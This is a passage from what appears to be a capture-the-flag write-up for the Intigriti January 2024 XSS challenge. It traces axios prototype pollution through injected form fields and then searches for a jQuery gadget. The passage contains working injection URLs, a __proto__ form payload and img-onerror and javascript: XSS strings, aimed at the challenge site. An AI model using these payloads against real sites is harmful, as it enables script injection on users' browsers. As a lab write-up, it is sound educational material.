<p>Moving on to the script block, it loads two things axios and jquery.The version of jquery is mentioned but axios isn’t.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">function</span> <span class="nf">search</span><span class="p">(</span><span class="nx">name</span><span class="p">)</span> <span class="p">{</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.loading</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">,</span> <span class="kc">false</span><span class="p">);</span>

        <span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span> <span class="p">}</span>
        <span class="p">}).</span><span class="nf">then</span><span class="p">((</span><span class="nx">d</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.loading</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
            <span class="kd">const</span> <span class="nx">repo</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
            <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Not found!</span><span class="dl">"</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">};</span>

            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.avatar</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">avatar_url</span><span class="p">);</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#description</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">description</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span> <span class="o">&amp;&amp;</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
                <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">,</span>
                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
                <span class="p">});</span>
            <span class="p">};</span>
        <span class="p">});</span>
    <span class="p">};</span>

    <span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">const</span> <span class="nx">params</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">URLSearchParams</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">);</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">params</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="p">))</span> <span class="nf">search</span><span class="p">();</span>

        <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">submit</span><span class="p">((</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nx">e</span><span class="p">.</span><span class="nf">preventDefault</span><span class="p">();</span>
            <span class="nf">search</span><span class="p">();</span>
        <span class="p">});</span>
    <span class="p">};</span>
</code></pre></div></div>

<p>Upon window load, it calls the <code class="language-plaintext highlighter-rouge">search</code> method, <code class="language-plaintext highlighter-rouge">params</code> variable contains the value of <em>search</em> query parameter.</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span> <span class="p">}</span>
        <span class="p">}).</span><span class="nf">then</span><span class="p">((</span><span class="nx">d</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.loading</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
            <span class="kd">const</span> <span class="nx">repo</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
            <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Not found!</span><span class="dl">"</span><span class="p">);</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">};</span>

            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.avatar</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">avatar_url</span><span class="p">);</span>
            <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#description</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">description</span><span class="p">);</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span> <span class="o">&amp;&amp;</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
                <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">,</span>
                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
                <span class="p">});</span>
            <span class="p">};</span>
        <span class="p">});</span>
</code></pre></div></div>

<p>Axios is used to make a post request to the search endpoint, the 2nd arguement is <code class="language-plaintext highlighter-rouge">$("#search").get(0)</code> which for some reasons looks weird.
It stores the response from the search endpoint in <code class="language-plaintext highlighter-rouge">repo</code> variable, if <code class="language-plaintext highlighter-rouge">repo.owner</code> is defined it moves on the next part of code</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.avatar</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">,</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">owner</span><span class="p">.</span><span class="nx">avatar_url</span><span class="p">);</span>

<span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">img.avatar</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="nx">corresponds</span> <span class="nx">to</span> <span class="nx">the</span> <span class="o">&lt;</span><span class="nx">img</span> <span class="kd">class</span><span class="o">=</span><span class="dl">"</span><span class="s2">avatar</span><span class="dl">"</span> <span class="nx">width</span><span class="o">=</span><span class="dl">"</span><span class="s2">35%</span><span class="dl">"</span><span class="o">&gt;</span> <span class="nx">element</span>
<span class="nx">It</span> <span class="nx">sets</span> <span class="nx">the</span> <span class="nx">src</span> <span class="nx">attribute</span> <span class="nx">value</span> <span class="kd">with</span> <span class="nx">what</span> <span class="nx">is</span> <span class="k">in</span> <span class="nx">the</span> <span class="s2">`repo.owner.avatar_url`</span> <span class="nx">property</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#description</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">description</span><span class="p">);</span>

<span class="o">&lt;</span><span class="nx">p</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">description</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/p&gt; /</span><span class="o">/</span> <span class="nx">sets</span> <span class="nx">the</span> <span class="nx">innerText</span> <span class="nx">property</span> <span class="nx">to</span> <span class="s2">`repo.description`</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>            <span class="k">if </span><span class="p">(</span><span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span> <span class="o">&amp;&amp;</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">.</span><span class="nf">startsWith</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://</span><span class="dl">"</span><span class="p">))</span> <span class="p">{</span>
                <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="nx">repo</span><span class="p">.</span><span class="nx">homepage</span><span class="p">,</span>
                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
                <span class="p">});</span>
            <span class="p">};</span>
</code></pre></div></div>

<p>It checks the value of <code class="language-plaintext highlighter-rouge">repo.homepage</code> if it starts <code class="language-plaintext highlighter-rouge">https://</code> or not. If it does it sets the value to the src attribute of <code class="language-plaintext highlighter-rouge">$("#homepage")</code> element which basically is an iframe</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"homepage"</span> <span class="na">hidden=</span><span class="s">""</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</code></pre></div></div>

<p>This kinda looks promising sink  as if somehow that check can be bypassed (with the help of quirk of this challenge) it would be easy to get xss if it went something like this</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"homepage"</span> <span class="na">hidden=</span><span class="s">""</span> <span class="na">src=</span><span class="s">"javascript:alert()"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">name</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">q</span><span class="p">;</span>
    <span class="nx">repo</span> <span class="o">=</span> <span class="p">{};</span>

    <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">item</span> <span class="k">of</span> <span class="nx">repos</span><span class="p">.</span><span class="nx">items</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">item</span><span class="p">.</span><span class="nx">full_name</span> <span class="o">&amp;&amp;</span> <span class="nx">item</span><span class="p">.</span><span class="nx">full_name</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">name</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">repo</span> <span class="o">=</span> <span class="nx">item</span>
	    <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">(</span><span class="nx">repo</span><span class="p">);</span>
<span class="p">});</span>
</code></pre></div></div>

<p>It basically searchs for the string provided in q param (search parameter ) and checks if a match is found in repos.json file (check the source)</p>

<p>For eg this loads:
https://challenge-0124.intigriti.io/challenge?name=shirley%3Cimg%20src=x%3E&amp;search=angular/material-start</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"homepage"</span> <span class="na">src=</span><span class="s">"https://angularjs-material-start.web.app"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
</code></pre></div></div>

<hr />

<h1 id="axios-prototype-pollution">Axios Prototype Pollution</h1>

<p>As I already said that the 2nd arg kinda look weird.Lets dig into it to see why it’s used that way</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span> <span class="p">}</span>
        <span class="p">})</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span><span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="o">&lt;</span><span class="nx">form</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">q</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">angular/material-start</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
</span></code></pre></div></div>

<p>Ok so they are passing full the whole form tag as 2nd arg?</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /search HTTP/1.1
Host: challenge-0124.intigriti.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Content-Type: application/json
Content-Length: 30

{"q":"angular/material-start"}
</code></pre></div></div>

<p>Cool, so it somehow converted that form tag to  json format.
Looking at some examples of axios post calls</p>

<p>https://github.com/axios/axios/blob/6d4c421ee157d93b47f3f9082a7044b1da221461/test/module/typings/cjs/index.ts#L91</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/user</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">foo</span><span class="p">:</span> <span class="dl">'</span><span class="s1">bar</span><span class="dl">'</span> <span class="p">})</span>
    <span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="nx">handleResponse</span><span class="p">)</span>
    <span class="p">.</span><span class="k">catch</span><span class="p">(</span><span class="nx">handleError</span><span class="p">);</span>
</code></pre></div></div>

<p>See the 2nd arg is actually in json format.
So a form tag was converted into  a json object, such conversions to json objects are often vulnerable to prototype pollution so I started searching on google for “axios prototype pollution”</p>

<p>The first seacrh result:</p>

<p>https://security.snyk.io/vuln/SNYK-JS-AXIOS-6144788</p>

<p>Commit: https://github.com/axios/axios/commit/3c0c11cade045c4412c242b5727308cff9897a0e</p>

<p>Indeed this is a fix for the pp bug, before there was no check for the key if it was equal to <code class="language-plaintext highlighter-rouge">__proto__</code>:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nf">formDataToJSON</span><span class="p">(</span><span class="nx">formData</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">function</span> <span class="nf">buildPath</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="nx">value</span><span class="p">,</span> <span class="nx">target</span><span class="p">,</span> <span class="nx">index</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">path</span><span class="p">[</span><span class="nx">index</span><span class="o">++</span><span class="p">];</span>

    <span class="k">if </span><span class="p">(</span><span class="nx">name</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">__proto__</span><span class="dl">'</span><span class="p">)</span> <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
</code></pre></div></div>
<p>One more file was changed in that commit which is used to check for regressions:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nf">it</span><span class="p">(</span><span class="dl">'</span><span class="s1">should resist prototype pollution CVE</span><span class="dl">'</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">formData</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FormData</span><span class="p">();</span>

    <span class="nx">formData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">'</span><span class="s1">foo[0]</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">1</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">formData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">'</span><span class="s1">foo[1]</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">2</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">formData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">'</span><span class="s1">__proto__.x</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">hack</span><span class="dl">'</span><span class="p">);</span>
    <span class="nx">formData</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="dl">'</span><span class="s1">constructor.prototype.y</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">value</span><span class="dl">'</span><span class="p">);</span>

    <span class="nf">expect</span><span class="p">(</span><span class="nf">formDataToJSON</span><span class="p">(</span><span class="nx">formData</span><span class="p">)).</span><span class="nf">toEqual</span><span class="p">({</span>
      <span class="na">foo</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">1</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">2</span><span class="dl">'</span><span class="p">],</span>
      <span class="na">constructor</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">prototype</span><span class="p">:</span> <span class="p">{</span>
          <span class="na">y</span><span class="p">:</span> <span class="dl">'</span><span class="s1">value</span><span class="dl">'</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">});</span>

    <span class="nf">expect</span><span class="p">({}.</span><span class="nx">x</span><span class="p">).</span><span class="nf">toEqual</span><span class="p">(</span><span class="kc">undefined</span><span class="p">);</span>
    <span class="nf">expect</span><span class="p">({}.</span><span class="nx">y</span><span class="p">).</span><span class="nf">toEqual</span><span class="p">(</span><span class="kc">undefined</span><span class="p">);</span>
  <span class="p">});</span>
<span class="p">});</span>
</code></pre></div></div>

<p>This gives us an idea about how the payload will look like to trigger the prototype pollution bug:</p>

<p>Sample prototype pollution payload:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">id</span><span class="o">=</span><span class="dl">"</span><span class="s2">search</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">q</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">angular/material-start</span><span class="dl">"</span><span class="o">&gt;</span>
    <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">name</span><span class="o">=</span><span class="dl">"</span><span class="s2">__proto__.x</span><span class="dl">"</span> <span class="nx">value</span><span class="o">=</span><span class="dl">"</span><span class="s2">hack</span><span class="dl">"</span><span class="o">/&gt;</span>
<span class="o">&lt;</span><span class="sr">/form</span><span class="err">&gt;
</span></code></pre></div></div>

<p>Our html injection is before the form tag, so we can supply the above prototype pollution payload</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h2&gt;</span>Hey <span class="nt">&lt;</span><span class="err">%</span><span class="na">-</span> <span class="na">name</span> <span class="err">%</span><span class="nt">&gt;</span>,<span class="nt">&lt;br&gt;</span>Which repo are you looking for?<span class="nt">&lt;/h2&gt;</span>

<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"search"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">value=</span><span class="s">"&lt;%= search %&gt;"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div>
<p>https://challenge-0124.intigriti.io/challenge?name=shirley%3Cform%20id=%22search%22%3E%20%3Cinput%20name=%22q%22%20value=%22angular/material-start%22%3E%20%3Cinput%20name=%22<strong>proto</strong>.x%22%20value=%22hack%22/%3E%20%3C/form%3E&amp;search=angular/material-start</p>

<p>It will render like this</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h2&gt;</span>Hey shirley<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"search"</span><span class="nt">&gt;</span> <span class="nt">&lt;input</span> <span class="na">value=</span><span class="s">"angular/material-start"</span> <span class="na">name=</span><span class="s">"q"</span><span class="nt">&gt;</span> <span class="nt">&lt;input</span> <span class="na">value=</span><span class="s">"hack"</span> <span class="na">name=</span><span class="s">"__proto__.x"</span><span class="nt">&gt;</span> <span class="nt">&lt;/form&gt;</span>,<span class="nt">&lt;br&gt;</span>Which repo are you looking for?<span class="nt">&lt;/h2&gt;</span>

<span class="nt">&lt;form</span> <span class="na">id=</span><span class="s">"search"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">value=</span><span class="s">"angular/material-start"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</code></pre></div></div>

<p>See now there are two form tags with same id <code class="language-plaintext highlighter-rouge">search</code>, one is the original  and the other which we injected contains the pp payload
As our injected form tag is first it will be used by axios instead</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">axios</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/search</span><span class="dl">"</span><span class="p">,</span> <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#search</span><span class="dl">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="p">{</span>
            <span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span> <span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">application/json</span><span class="dl">"</span> <span class="p">}</span>
        <span class="p">})</span>
</code></pre></div></div>

<p>Here we go , we successfully polluted the <code class="language-plaintext highlighter-rouge">x</code> property.</p>

<p><img src="https://github.com/Sudistark/CTF-Writeups/assets/31372554/a8608493-c73b-428b-91a9-f4d7828c07b8" alt="image" /></p>

<hr />

<h1 id="prototype-pollution-gadget">Prototype Pollution Gadget</h1>

<p>As I had no idea about how to get xss for now, I though why not try looking for a pp gadget in axios or jquery.As that can give easy xss.
Here you can find a bunch of gadgets for jquery: https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md#xoff-jquery-all-versions</p>

<p>For axios I didn’t find anything from google search and the jquery ones didn’t seemed related to the challenge.</p>

<p>So the only possible way was to look for a new jquery gadget :)</p>

<p>To make the process easiere I was using a local version which had the jquery unminified version</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script</span><span class="err">/</span><span class="na">src=</span><span class="s">https://code.jquery.com/jquery-3.7.1.js</span><span class="nt">&gt;&lt;/script&gt;</span>
<span class="nt">&lt;script&gt;</span>
  
  <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">test</span><span class="o">=</span><span class="dl">"</span><span class="s2">&lt;img src=x onerror=alert()&gt;</span><span class="dl">"</span>

<span class="nt">&lt;/script&gt;</span>

<span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"homepage"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
<span class="nt">&lt;img</span> <span class="na">class=</span><span class="s">"avatar"</span> <span class="na">width=</span><span class="s">"35%"</span> <span class="na">src=</span><span class="s">"https://avatars.githubusercontent.com/u/52466165?v=4"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;p</span> <span class="na">id=</span><span class="s">"description"</span><span class="nt">&gt;</span>A tool to calculate the contrast ratio between any two valid CSS colors.<span class="nt">&lt;/p&gt;</span>


<span class="nt">&lt;script&gt;</span>
<span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#description</span><span class="dl">"</span><span class="p">).</span><span class="nf">text</span><span class="p">(</span><span class="dl">"</span><span class="s2">hello</span><span class="dl">"</span><span class="p">);</span>
       <span class="nf">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#homepage</span><span class="dl">"</span><span class="p">).</span><span class="nf">attr</span><span class="p">({</span>
                    <span class="dl">"</span><span class="s2">src</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span><span class="p">,</span>
                    <span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
                <span class="p">});</span>
<span class="nt">&lt;/script&gt;</span>


</code></pre></div></div>

<p>One thing was starnge after using a pp payload, this error appeared in the console:</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Uncaught</span> <span class="nx">TypeError</span><span class="p">:</span> <span class="nx">Cannot</span> <span class="nx">use</span> <span class="dl">'</span><span class="s1">in</span><span class="dl">'</span> <span class="nx">operator</span> <span class="nx">to</span> <span class="nx">search</span> <span class="k">for</span> <span class="dl">'</span><span class="s1">set</span><span class="dl">'</span> <span class="k">in</span> <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="nx">x</span> <span class="nx">onerror</span><span class="o">=</span><span class="nf">alert</span><span class="p">()</span><span class="o">&gt;</span>
    <span class="nx">at</span> <span class="nf">attr </span><span class="p">(</span><span class="nx">jquery</span><span class="o">-</span><span class="mf">3.7</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">7910</span><span class="p">:</span><span class="mi">24</span><span class="p">)</span>
    <span class="nx">at</span> <span class="nf">access </span><span class="p">(</span><span class="nx">jquery</span><span class="o">-</span><span class="mf">3.7</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">3919</span><span class="p">:</span><span class="mi">5</span><span class="p">)</span>
    <span class="nx">at</span> <span class="nf">access </span><span class="p">(</span><span class="nx">jquery</span><span class="o">-</span><span class="mf">3.7</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">3890</span><span class="p">:</span><span class="mi">4</span><span class="p">)</span>
